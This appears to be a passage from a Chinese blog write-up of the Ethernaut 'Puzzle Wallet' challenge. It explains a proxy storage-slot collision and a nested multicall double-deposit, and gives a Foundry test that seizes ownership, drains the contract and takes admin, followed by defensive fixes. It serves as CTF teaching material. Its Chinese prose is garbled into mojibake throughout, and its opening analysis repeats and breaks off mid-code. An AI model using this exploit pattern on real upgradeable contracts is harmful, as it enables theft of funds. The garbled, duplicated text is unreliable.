<code>pendingAdmin</code> (slot 0) å®é™…ä¸Šå¯¹åº” <code>PuzzleWallet</code> çš„ <code>owner</code> (slot 0)ã€‚</li>\n<li><code>PuzzleProxy</code> çš„ <code>admin</code> (slot 1) å®é™…ä¸Šå¯¹åº” <code>PuzzleWallet</code> çš„ <code>maxBalance</code> (slot 1)ã€‚</li>\n</ul>\n<p>æˆ‘ä»¬çš„æœ€ç»ˆç›®æ ‡æ˜¯æˆä¸º <code>PuzzleProxy</code> çš„ <code>admin</code>ã€‚æ ¹æ®å­˜å‚¨å†²çªï¼Œ<strong>æˆ‘ä»¬åªéœ€è¦å°† <code>PuzzleWallet</code> çš„ <code>maxBalance</code> è®¾ç½®ä¸ºæˆ‘ä»¬çš„åœ°å€å³å¯</strong>ã€‚</p>\n<h3 id=\"æ¼æ´-2-æˆä¸º-owner-å¹¶åŠ å…¥ç™½åå•\"><a href=\"#æ¼æ´-2-æˆä¸º-owner-å¹¶åŠ å…¥ç™½åå•\" class=\"headerlink\" title=\"æ¼æ´ 2: æˆä¸º owner å¹¶åŠ å…¥ç™½åå•\"></a>æ¼æ´ 2: æˆä¸º <code>owner</code> å¹¶åŠ å…¥ç™½åå•</h3><p>è¦è°ƒç”¨ <code>setMaxBalance()</code>ï¼Œæˆ‘ä»¬å¿…é¡»æ˜¯ç™½åå•ç”¨æˆ·ã€‚è¦åŠ å…¥ç™½åå•ï¼Œæˆ‘ä»¬å¿…é¡»æ˜¯ <code>PuzzleWallet</code> çš„ <code>owner</code>ã€‚</p>\n<ul>\n<li><code>PuzzleWallet</code> çš„ <code>owner</code> å­˜å‚¨åœ¨ slot 0ã€‚</li>\n<li><code>PuzzleProxy</code> çš„ <code>proposeNewAdmin()</code> å‡½æ•°å¯ä»¥ä¿®æ”¹ <code>pendingAdmin</code>ï¼Œä¹Ÿå°±æ˜¯ä¿®æ”¹ slot 0ã€‚</li>\n</ul>\n<p>å› æ­¤ï¼Œç¬¬ä¸€æ­¥æ˜¯é€šè¿‡è°ƒç”¨ <code>proxy.proposeNewAdmin(player_address)</code> æ¥å°† <code>wallet.owner</code> è®¾ç½®ä¸ºæˆ‘ä»¬è‡ªå·±çš„åœ°å€ã€‚</p>\n<p>æˆä¸º <code>owner</code> åï¼Œæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨ <code>wallet.addToWhitelist(player_address)</code> å°†è‡ªå·±åŠ å…¥ç™½åå•ã€‚</p>\n<h3 id=\"æ¼æ´-3-multicall-é€»è¾‘æ¼æ´ä¸æ¸…ç©ºåˆçº¦ä½™é¢\"><a href=\"#æ¼æ´-3-multicall-é€»è¾‘æ¼æ´ä¸æ¸…ç©ºåˆçº¦ä½™é¢\" class=\"headerlink\" title=\"æ¼æ´ 3: multicall é€»è¾‘æ¼æ´ä¸æ¸…ç©ºåˆçº¦ä½™é¢\"></a>æ¼æ´ 3: <code>multicall</code> é€»è¾‘æ¼æ´ä¸æ¸…ç©ºåˆçº¦ä½™é¢</h3><p>ç°åœ¨æˆ‘ä»¬æ˜¯ç™½åå•ç”¨æˆ·äº†ï¼Œä½† <code>setMaxBalance()</code> è¿˜æœ‰ä¸€ä¸ªè¦æ±‚ï¼š<code>require(address(this).balance == 0, &quot;Contract balance is not 0&quot;)</code>ã€‚åˆçº¦åœ¨éƒ¨ç½²æ—¶è¢«å­˜å…¥äº† 0.001 etherï¼Œæˆ‘ä»¬éœ€è¦æƒ³åŠæ³•å°†åˆçº¦ä½™é¢æ¸…ç©ºã€‚</p>\n<p><code>execute()</code> å‡½æ•°å¯ä»¥ææ¬¾ï¼Œä½†æˆ‘ä»¬åªèƒ½æå‡ºæˆ‘ä»¬å­˜å…¥çš„é‡‘é¢ã€‚é—®é¢˜åœ¨äºåˆçº¦ä¸­å·²æœ‰çš„ 0.001 etherã€‚</p>\n<p>å…³é”®åœ¨äº <code>multicall()</code> å‡½æ•°ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123;</span><br><span class=\"line\">    bool depositCalled = false;</span><br><span class=\"line\">    for (uint i = 0; i &lt; data.length; i++) &#123;</span><br><span class=\"line\">        // ...</span><br><span class=\"line\">        if (selector == this.deposit.selector) &#123;</span><br><span class=\"line\">            require(!depositCalled, &quot;Deposit can only be called once&quot;);</span><br><span class=\"line\">            depositCalled = true;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        (bool success, ) = address(this).delegatecall(data[i]);</span><br><span class=\"line\">        // ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>å‡½æ•°é€šè¿‡ <code>depositCalled</code> æ ‡å¿—ä½æ¥é˜²æ­¢åœ¨ä¸€æ¬¡ <code>multicall</code> ä¸­å¤šæ¬¡è°ƒç”¨ <code>deposit()</code>ã€‚ä½†æ˜¯ï¼Œè¿™ä¸ªä¿æŠ¤æªæ–½æ˜¯æœ‰ç¼ºé™·çš„ã€‚<code>depositCalled</code> æ˜¯ä¸€ä¸ªå±€éƒ¨å˜é‡ï¼Œå®ƒçš„ä½œç”¨åŸŸä»…é™äºå•æ¬¡ <code>multicall</code> è°ƒç”¨ã€‚å¦‚æœæˆ‘ä»¬<strong>åœ¨ä¸€ä¸ª <code>multicall</code> è°ƒç”¨ä¸­åµŒå¥—å¦ä¸€ä¸ª <code>multicall</code> è°ƒç”¨</strong>ï¼Œé‚£ä¹ˆå†…éƒ¨çš„ <code>multicall</code> ä¼šæœ‰è‡ªå·±çš„ã€å…¨æ–°çš„ <code>depositCalled</code> æ ‡å¿—ä½ã€‚</p>\n<p>è¿™å…è®¸æˆ‘ä»¬ç»•è¿‡æ£€æŸ¥ï¼Œå®ç°â€œåŒé‡å­˜æ¬¾â€ï¼š</p>\n<ol>\n<li>æˆ‘ä»¬å‘ <code>multicall</code> å‘é€ 0.001 etherã€‚</li>\n<li><code>multicall</code> çš„ç¬¬ä¸€ä¸ªè°ƒç”¨æ˜¯ <code>deposit()</code>ã€‚è¿™ä¼šæŠŠæˆ‘ä»¬çš„ <code>msg.value</code> (0.001 ether) å­˜å…¥ï¼Œå¹¶å°†æˆ‘ä»¬çš„ä½™é¢è®°å½•ä¸º 0.001 etherã€‚</li>\n<li><code>multicall</code> çš„ç¬¬äºŒä¸ªè°ƒç”¨æ˜¯<strong>å¯¹ <code>multicall</code> è‡ªèº«çš„åµŒå¥—è°ƒç”¨</strong>ã€‚åœ¨è¿™ä¸ªåµŒå¥—è°ƒç”¨ä¸­ï¼Œæˆ‘ä»¬å†æ¬¡è°ƒç”¨ <code>deposit()</code>ã€‚</li>\n<li>ç”±äº <code>delegatecall</code> çš„ç‰¹æ€§ï¼Œ<code>msg.value</code> åœ¨åµŒå¥—è°ƒç”¨ä¸­ä¿æŒä¸å˜ã€‚å› æ­¤ï¼Œç¬¬äºŒæ¬¡ <code>deposit()</code> ä¼šå†æ¬¡å°†åŒä¸€ä¸ª <code>msg.value</code> (0.001 ether) å­˜å…¥ï¼Œä½¿æˆ‘ä»¬çš„è®°å½•ä½™é¢å˜ä¸º 0.002 etherã€‚</li>\n</ol>\n<p>æˆ‘ä»¬åªå‘é€äº† 0.001 etherï¼Œä½†åœ¨åˆçº¦ä¸­çš„å­˜æ¬¾è®°å½•å´æ˜¯ 0.002 etherã€‚ç°åœ¨ï¼Œæˆ‘ä»¬è°ƒç”¨ <code>execute(player, 0.002 ether, &quot;&quot;)</code>ï¼Œå°±å¯ä»¥æèµ°åˆçº¦ä¸­æ‰€æœ‰çš„èµ„é‡‘ï¼ˆæˆ‘ä»¬å­˜å…¥çš„0.001 + åˆçº¦åŸæœ‰çš„0.001ï¼‰ã€‚</p>\n<h3 id=\"æœ€ç»ˆæ”»å‡»æµç¨‹\"><a href=\"#æœ€ç»ˆæ”»å‡»æµç¨‹\" class=\"headerlink\" title=\"æœ€ç»ˆæ”»å‡»æµç¨‹\"></a>æœ€ç»ˆæ”»å‡»æµç¨‹</h3><ol>\n<li><strong>æˆä¸º <code>owner</code></strong>: è°ƒç”¨ <code>proxy.proposeNewAdmin(player)</code>ã€‚</li>\n<li><strong>åŠ å…¥ç™½åå•</strong>: è°ƒç”¨ <code>wallet.addToWhitelist(player)</code>ã€‚</li>\n<li><strong>åŒé‡å­˜æ¬¾</strong>: æ„é€ ä¸€ä¸ªåµŒå¥—çš„ <code>multicall</code> è°ƒç”¨ï¼Œå‘é€ 0.001 etherï¼Œä½¿è‡ªå·±çš„å­˜æ¬¾è®°å½•å˜ä¸º 0.002 etherã€‚</li>\n<li><strong>æ¸…ç©ºåˆçº¦</strong>: è°ƒç”¨ <code>wallet.execute(player, 0.002 ether, &quot;&quot;)</code> æèµ°æ‰€æœ‰èµ„é‡‘ã€‚</li>\n<li><strong>æˆä¸º <code>admin</code></strong>: è°ƒç”¨ <code>wallet.setMaxBalance(uint256(uint160(player)))</code>ï¼Œå°† <code>maxBalance</code> (å³ <code>admin</code>) è®¾ç½®ä¸ºæˆ‘ä»¬çš„åœ°å€ã€‚</li>\n</ol>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/24_PuzzleWallet.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract PuzzleWalletTest is Test &#123;</span><br><span class=\"line\">    PuzzleProxy proxy;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\">    PuzzleWallet wallet;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\"></span><br><span class=\"line\">        // éƒ¨ç½²é€»è¾‘åˆçº¦å’Œä»£ç†åˆçº¦</span><br><span class=\"line\">        PuzzleWallet puzzleWallet = new PuzzleWallet();</span><br><span class=\"line\">        bytes memory data = abi.encodeWithSelector(PuzzleWallet.init.selector, 1 ether);</span><br><span class=\"line\">        proxy = new PuzzleProxy(address(this), address(puzzleWallet), data);</span><br><span class=\"line\">        wallet = PuzzleWallet(address(proxy));</span><br><span class=\"line\"></span><br><span class=\"line\">        // åˆå§‹è®¾ç½®ï¼Œå­˜å…¥ 0.001 ether</span><br><span class=\"line\">        vm.deal(address(this), 0.001 ether);</span><br><span class=\"line\">        wallet.addToWhitelist(address(this));</span><br><span class=\"line\">        wallet.deposit&#123;value: 0.001 ether&#125;();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testPuzzleWalletAttack() public &#123;</span><br><span class=\"line\">        vm.deal(player, 0.001 ether);</span><br><span class=\"line\">        vm.startPrank(player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 1. æˆä¸º owner</span><br><span class=\"line\">        proxy.proposeNewAdmin(player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 2. åŠ å…¥ç™½åå•</span><br><span class=\"line\">        wallet.addToWhitelist(player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 3. æ„é€ åµŒå¥— multicall ä»¥å®ç°åŒé‡å­˜æ¬¾</span><br><span class=\"line\">        bytes[] memory nestedCalls = new bytes[](1);</span><br><span class=\"line\">        nestedCalls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);</span><br><span class=\"line\"></span><br><span class=\"line\">        bytes[] memory calls = new bytes[](2);</span><br><span class=\"line\">        calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);</span><br><span class=\"line\">        calls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, nestedCalls);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // å‘é€ 0.001 etherï¼Œä½†å­˜æ¬¾ä¸¤æ¬¡</span><br><span class=\"line\">        wallet.multicall&#123;value: 0.001 ether&#125;(calls);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 4. æèµ°æ‰€æœ‰èµ„é‡‘ (0.002 ether)</span><br><span class=\"line\">        wallet.execute(player, 0.002 ether, &quot;&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 5. æˆä¸º admin</span><br><span class=\"line\">        wallet.setMaxBalance(uint256(uint160(player)));</span><br><span class=\"line\"></span><br><span class=\"line\">        // éªŒè¯æˆåŠŸ</span><br><span class=\"line\">        assertEq(proxy.admin(), player);</span><br><span class=\"line\"></span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><ol>\n<li><strong>å¯¹é½å­˜å‚¨å¸ƒå±€</strong>: åœ¨ä½¿ç”¨ä»£ç†æ¨¡å¼æ—¶ï¼Œå¿…é¡»ç¡®ä¿ä»£ç†åˆçº¦å’Œé€»è¾‘åˆçº¦çš„å­˜å‚¨å¸ƒå±€æ˜¯å…¼å®¹çš„ï¼Œä»¥é¿å…å­˜å‚¨å†²çªã€‚åœ¨ä»£ç†åˆçº¦ä¸­ä¸ºæœªæ¥çš„å‡çº§ä¿ç•™ä¸€äº›ç©ºçš„å­˜å‚¨æ§½æ˜¯ä¸€ç§å¸¸è§çš„åšæ³•ã€‚</li>\n<li><strong>ä¿®å¤ <code>multicall</code> æ¼æ´</strong>: <code>multicall</code> ä¸­çš„é‡å…¥ä¿æŠ¤åº”è¯¥ä½¿ç”¨çŠ¶æ€å˜é‡è€Œä¸æ˜¯å±€éƒ¨å˜é‡ã€‚å°† <code>depositCalled</code> å£°æ˜ä¸ºåˆçº¦çš„çŠ¶æ€å˜é‡ï¼Œå¹¶åœ¨ <code>multicall</code> å¼€å§‹æ—¶è®¾ç½®ï¼Œç»“æŸæ—¶æ¸…é™¤ï¼Œå¯ä»¥é˜²æ­¢åµŒå¥—è°ƒç”¨ç»•è¿‡æ£€æŸ¥ã€‚</li>\n<li><strong>åŸå­åŒ–çŠ¶æ€å˜æ›´</strong>: é¿å…åœ¨ä¸€æ¬¡å‡½æ•°è°ƒç”¨ä¸­æ··åˆå¤šç§å¤æ‚é€»è¾‘ï¼ˆå¦‚å­˜æ¬¾å’Œä»»æ„ <code>delegatecall</code>ï¼‰ã€‚å°†åŠŸèƒ½åˆ†è§£ä¸ºæ›´å°ã€æ›´åŸå­åŒ–çš„å‡½æ•°å¯ä»¥å‡å°‘æ„å¤–çš„äº¤äº’ã€‚</li>\n</ol>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li><strong>ä»£ç†å­˜å‚¨å†²çª</strong>: <code>delegatecall</code> çš„æ ¸å¿ƒé£é™©ä¹‹ä¸€ã€‚ä»£ç†å’Œé€»è¾‘åˆçº¦çš„å­˜å‚¨å˜é‡å¿…é¡»ç²¾ç¡®å¯¹é½ï¼Œå¦åˆ™ä¸€ä¸ªåˆçº¦çš„å˜é‡å¯èƒ½ä¼šè¢«å¦ä¸€ä¸ªåˆçº¦çš„å‡½æ•°æ„å¤–åœ°ä¿®æ”¹ã€‚</li>\n<li><strong>åµŒå¥— <code>delegatecall</code></strong>: å¯¹ <code>delegatecall</code> çš„åµŒå¥—è°ƒç”¨ä¼šç»§æ‰¿åŸå§‹è°ƒç”¨çš„ä¸Šä¸‹æ–‡ï¼ˆå¦‚ <code>msg.sender</code>, <code>msg.value</code>ï¼‰ï¼Œä½†ä¼šåˆ›å»ºæ–°çš„å±€éƒ¨å˜é‡ä½œç”¨åŸŸï¼Œè¿™å¯èƒ½è¢«ç”¨æ¥ç»•è¿‡åŸºäºå±€éƒ¨å˜é‡çš„å®‰å…¨æ£€æŸ¥ã€‚</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>åˆ©ç”¨å­˜å‚¨å†²çªï¼Œé€šè¿‡è°ƒç”¨ä¸€ä¸ªçœ‹ä¼¼æ— å…³çš„å‡½æ•°ï¼ˆ<code>proposeNewAdmin</code>ï¼‰æ¥ä¿®æ”¹ä¸€ä¸ªå…³é”®çš„çŠ¶æ€å˜é‡ï¼ˆ<code>owner</code>ï¼‰ã€‚</li>\n<li>åˆ©ç”¨ <code>multicall</code> ä¸­åŸºäºå±€éƒ¨å˜é‡çš„é‡å…¥ä¿æŠ¤ç¼ºé™·ï¼Œé€šè¿‡åµŒå¥—è°ƒç”¨å®ç°åŒé‡è®°è´¦ï¼Œä»è€Œçªƒå–åˆçº¦èµ„é‡‘ã€‚</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>ä»”ç»†è§„åˆ’å’ŒéªŒè¯ä»£ç†åˆçº¦çš„å­˜å‚¨å¸ƒå±€ã€‚</li>\n<li>ä½¿ç”¨çŠ¶æ€å˜é‡æ¥å®ç°é‡å…¥ä¿æŠ¤ï¼Œè€Œä¸æ˜¯å±€éƒ¨å˜é‡ã€‚</li>\n</ul>\n<h2 id=\"ğŸ“š-å‚è€ƒèµ„æ–™\"><a href=\"#ğŸ“š-å‚è€ƒèµ„æ–™\" class=\"headerlink\" title=\"ğŸ“š å‚è€ƒèµ„æ–™\"></a>ğŸ“š å‚è€ƒèµ„æ–™</h2><ul>\n<li><a href=\"https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable\">OpenZeppelin: Writing Upgradeable Contracts</a></li>\n<li><a href=\"https://swcregistry.io/docs/SWC-112\">SWC-112: Delegatecall to Untrusted Callee</a></li>\n</ul>\n","more":"<h1 id=\"ğŸ¯-Ethernaut-Level-24-Puzzle-Wallet-ä»£ç†å­˜å‚¨å†²çªä¸åµŒå¥—è°ƒç”¨æ¼æ´\"><a href=\"#ğŸ¯-Ethernaut-Level-24-Puzzle-Wallet-ä»£ç†å­˜å‚¨å†²çªä¸åµŒå¥—è°ƒç”¨æ¼æ´\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 24: Puzzle Wallet - ä»£ç†å­˜å‚¨å†²çªä¸åµŒå¥—è°ƒç”¨æ¼æ´\"></a>ğŸ¯ Ethernaut Level 24: Puzzle Wallet - ä»£ç†å­˜å‚¨å†²çªä¸åµŒå¥—è°ƒç”¨æ¼æ´</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/24\">Ethernaut Level 24 - Puzzle Wallet</a><br><strong>æ”»å‡»ç±»å‹</strong>: å­˜å‚¨å¸ƒå±€å†²çª &#x2F; é€»è¾‘æ¼æ´<br><strong>éš¾åº¦</strong>: â­â­â­â­â­</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>æœ¬å…³çš„ç›®æ ‡æ˜¯æˆä¸º <code>PuzzleProxy</code> åˆçº¦çš„ <code>admin</code>ã€‚</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel24.svg\" alt=\"Puzzle Wallet Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><p>è¿™æ˜¯ä¸€ä¸ªæ¶‰åŠä»£ç†åˆçº¦ï¼ˆProxyï¼‰çš„å¤æ‚æŒ‘æˆ˜ï¼ŒåŒ…å«äº†å¤šä¸ªæ¼æ´çš„ç»„åˆåˆ©ç”¨ã€‚æˆ‘ä»¬éœ€è¦åˆ†æ­¥è§£å†³å‡ ä¸ªå­é—®é¢˜ã€‚</p>\n<h3 id=\"æ¼æ´-1-ä»£ç†å­˜å‚¨å¸ƒå±€å†²çª\"><a href=\"#æ¼æ´-1-ä»£ç†å­˜å‚¨å¸ƒå±€å†²çª\" class=\"headerlink\" title=\"æ¼æ´ 1: ä»£ç†å­˜å‚¨å¸ƒå±€å†²çª\"></a>æ¼æ´ 1: ä»£ç†å­˜å‚¨å¸ƒå±€å†²çª</h3><p>é¦–å…ˆï¼Œæˆ‘ä»¬æ£€æŸ¥ <code>PuzzleProxy</code> (ä»£ç†) å’Œ <code>PuzzleWallet</code> (é€»è¾‘) åˆçº¦çš„å­˜å‚¨å¸ƒå±€ã€‚</p>\n<p><strong><code>PuzzleProxy</code> çš„å­˜å‚¨:</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract PuzzleProxy is Proxy &#123;</span><br><span class=\"line\">    address public pendingAdmin; // slot 0</span><br><span class=\"line\">    address public admin;      // slot 1</span><br><span class=\"line\">    // ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong><code>PuzzleWallet</code> çš„å­˜å‚¨:</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract PuzzleWallet is Ownable &#123;</span><br><span class=\"line\">    address public owner;      // slot 0 (ç»§æ‰¿è‡ª Ownable)</span><br><span class=\"line\">    uint256 public maxBalance; // slot 1</span><br><span class=\"line\">    mapping(address =&gt; bool) public whitelisted; // slot 2</span><br><span class=\"line\">    // ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>ç”±äºä»£ç†æ¨¡å¼ä½¿ç”¨ <code>delegatecall</code>ï¼Œ<code>PuzzleWallet</code> çš„ä»£ç ä¼šç›´æ¥æ“ä½œ <code>PuzzleProxy</code> çš„å­˜å‚¨ã€‚è¿™å°±å¯¼è‡´äº†å­˜å‚¨æ§½çš„å†²çªï¼š</p>\n<ul>\n<li><code>PuzzleProxy</code> çš„ <code>pendingAdmin</code> (slot 0) å®é™…ä¸Šå¯¹åº” <code>PuzzleWallet</code> çš„ <code>owner</code> (slot 0)ã€‚</li>\n<li><code>PuzzleProxy</code> çš„ <code>admin</code> (slot 1) å®é™…ä¸Šå¯¹åº” <code>PuzzleWallet</code> çš„ <code>maxBalance</code> (slot 1)ã€‚</li>\n</ul>\n<p>æˆ‘ä»¬çš„æœ€ç»ˆç›®æ ‡æ˜¯æˆä¸º <code>PuzzleProxy</code> çš„ <code>admin</code>ã€‚æ ¹æ®å­˜å‚¨å†²çªï¼Œ<strong>æˆ‘ä»¬åªéœ€è¦å°† <code>PuzzleWallet</code> çš„ <code>maxBalance</code> è®¾ç½®ä¸ºæˆ‘ä»¬çš„åœ°å€å³å¯</strong>ã€‚</p>\n<h3 id=\"æ¼æ´-2-æˆä¸º-owner-å¹¶åŠ å…¥ç™½åå•\"><a href=\"#æ¼æ´-2-æˆä¸º-owner-å¹¶åŠ å…¥ç™½åå•\" class=\"headerlink\" title=\"æ¼æ´ 2: æˆä¸º owner å¹¶åŠ å…¥ç™½åå•\"></a>æ¼æ´ 2: æˆä¸º <code>owner</code> å¹¶åŠ å…¥ç™½åå•</h3><p>è¦è°ƒç”¨ <code>setMaxBalance()</code>ï¼Œæˆ‘ä»¬å¿…é¡»æ˜¯ç™½åå•ç”¨æˆ·ã€‚è¦åŠ å…¥ç™½åå•ï¼Œæˆ‘ä»¬å¿…é¡»æ˜¯ <code>PuzzleWallet</code> çš„ <code>owner</code>ã€‚</p>\n<ul>\n<li><code>PuzzleWallet</code> çš„ <code>owner</code> å­˜å‚¨åœ¨ slot 0ã€‚</li>\n<li><code>PuzzleProxy</code> çš„ <code>proposeNewAdmin()</code> å‡½æ•°å¯ä»¥ä¿®æ”¹ <code>pendingAdmin</code>ï¼Œä¹Ÿå°±æ˜¯ä¿®æ”¹ slot 0ã€‚</li>\n</ul>\n<p>å› æ­¤ï¼Œç¬¬ä¸€æ­¥æ˜¯é€šè¿‡è°ƒç”¨ <code>proxy.proposeNewAdmin(player_address)</code> æ¥å°† <code>wallet.owner</code> è®¾ç½®ä¸ºæˆ‘ä»¬è‡ªå·±çš„åœ°å€ã€‚</p>\n<p>æˆä¸º <code>owner</code> åï¼Œæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨ <code>wallet.addToWhitelist(player_address)</code> å°†è‡ªå·±åŠ å…¥ç™½åå•ã€‚</p>\n<h3 id=\"æ¼æ´-3-multicall-é€»è¾‘æ¼æ´ä¸æ¸…ç©ºåˆçº¦ä½™é¢\"><a href=\"#æ¼æ´-3-multicall-é€»è¾‘æ¼æ´ä¸æ¸…ç©ºåˆçº¦ä½™é¢\" class=\"headerlink\" title=\"æ¼æ´ 3: multicall é€»è¾‘æ¼æ´ä¸æ¸…ç©ºåˆçº¦ä½™é¢\"></a>æ¼æ´ 3: <code>multicall</code> é€»è¾‘æ¼æ´ä¸æ¸…ç©ºåˆçº¦ä½™é¢</h3><p>ç°åœ¨æˆ‘ä»¬æ˜¯ç™½åå•ç”¨æˆ·äº†ï¼Œä½† <code>setMaxBalance()</code> è¿˜æœ‰ä¸€ä¸ªè¦æ±‚ï¼š<code>require(address(this).balance == 0, &quot;Contract balance is not 0&quot;)</code>ã€‚åˆçº¦åœ¨éƒ¨ç½²æ—¶è¢«å­˜å…¥äº† 0.001 etherï¼Œæˆ‘ä»¬éœ€è¦æƒ³åŠæ³•å°†åˆçº¦ä½™é¢æ¸…ç©ºã€‚</p>\n<p><code>execute()</code> å‡½æ•°å¯ä»¥ææ¬¾ï¼Œä½†æˆ‘ä»¬åªèƒ½æå‡ºæˆ‘ä»¬å­˜å…¥çš„é‡‘é¢ã€‚é—®é¢˜åœ¨äºåˆçº¦ä¸­å·²æœ‰çš„ 0.001 etherã€‚</p>\n<p>å…³é”®åœ¨äº <code>multicall()</code> å‡½æ•°ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123;</span><br><span class=\"line\">    bool depositCalled = false;</span><br><span class=\"line\">    for (uint i = 0; i &lt; data.length; i++) &#123;</span><br><span class=\"line\">        // ...</span><br><span class=\"line\">        if (selector == this.deposit.selector) &#123;</span><br><span 